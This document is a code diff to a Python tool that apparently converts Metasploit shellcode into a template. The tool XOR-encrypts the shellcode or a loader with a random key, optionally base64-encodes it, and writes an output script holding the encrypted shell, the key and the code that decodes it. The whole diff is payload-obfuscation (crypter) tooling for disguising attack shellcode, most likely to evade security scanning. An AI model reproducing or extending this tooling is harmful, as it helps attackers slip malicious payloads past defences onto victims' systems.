@@ -10,10 +10,22 @@ class _MSF_Call:
     def __init__(self):
         self._Features()
     def _Features(self,**kwargs):
-        with open (self.args.exploit,'rt') as TEXT:
-            Text = TEXT.readlines()
-        with open (os.getcwd()+'/Package/Template/ShellCode.txt','wt') as Shell:
-                 Shell.write('ShellCode = b""\n')   
+        if not self.args.assembly :
+            with open (self.args.exploit,'rt') as TEXT:
+                Text = TEXT.readlines()
+            with open (os.getcwd()+'/Package/Template/ShellCode.txt','wt') as Shell:
+                if self.args.load:
+                    Shell.write('ShellCode = b""\n')
+                else:    
+                    Shell.write('    ShellCode = b""\n')  
+        else:
+            with open (os.getcwd()+'/Package/Template/FileNameObjectShellCode','rt') as TEXT:
+                Text = TEXT.readlines()
+            with open (os.getcwd()+'/Package/Template/ShellCode.txt','wt') as Shell:
+                if self.args.load:
+                    Shell.write('ShellCode = b""\n')
+                else:    
+                    Shell.write('    ShellCode = b""\n')             
         for L in Text[1:] :
             Find_Str = re.findall('"+.+"',L)
             CompleteShell = 'ShellCode += b'+str("".join(Find_Str).replace('[]','',1))+'\n'
@@ -26,7 +38,6 @@ if __name__=='__main__':
    _MSF_Call()   
 
 
-
 class Xor_class :
 
     def __init__(self):
@@ -35,12 +46,20 @@ class Xor_class :
         self.Fainal_Stage()
 
     def Gen_Key(self,**kwargs):  
-        with open (self.args.exploit,'r') as payload:
-            if self.args.P_base64:
-                payload = payload.read()
-                payload = base64.b64encode(payload.encode())
-            else:
-                payload = bytes(payload.read().encode())   
+        if self.args.load:
+             with open (os.getcwd()+'/Package/Template/TempPayloadLoader.txt','r') as payload:
+                if self.args.P_base64:
+                    payload = payload.read()
+                    payload = base64.b64encode(payload.encode())
+                else:
+                    payload = bytes(payload.read().encode()) 
+        else:         
+            with open (os.getcwd()+'/Package/Template/ShellCode.txt','r') as payload:
+                if self.args.P_base64:
+                    payload = payload.read()
+                    payload = base64.b64encode(payload.encode())
+                else:
+                    payload = bytes(payload.read().encode())   
         Value_Key =  secrets.token_bytes(len(payload))
         if self.args.Key_base64:
            Value_Key = base64.b64encode(Value_Key)
@@ -53,6 +72,7 @@ class Xor_class :
         self.Xor_Payload = bytes([ I  ^ L for I , L in zip(self.payload ,self.Value_Key) ])
    
     def Fainal_Stage(self,**kwargs) : 
+        
          with open(self.args.output,'w') as XP_load:
              XP_load1 = 'shell = '+str(self.Xor_Payload)+'\n'+'Key = '+str(self.Value_Key)+'\n'+\
              "de_code = bytes([ Z ^ C for Z , C in zip(shell , Key)])"+'\n'+'import base64\n'+\
